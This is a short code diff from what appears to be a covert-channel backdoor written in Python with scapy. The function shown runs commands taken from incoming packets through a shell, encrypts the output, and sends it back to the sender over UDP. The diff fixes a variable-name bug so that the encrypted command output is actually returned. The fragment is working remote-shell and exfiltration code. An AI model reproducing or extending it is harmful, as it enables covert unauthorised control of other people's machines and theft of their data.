@@ -44,7 +44,7 @@ def runCommand(packet):
   print "Running command " + data
   output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
   encryptedOutput = encryptionObject.encrypt(output)
-  packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
+  packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
   time.sleep(0.1)
   send(packet)
 
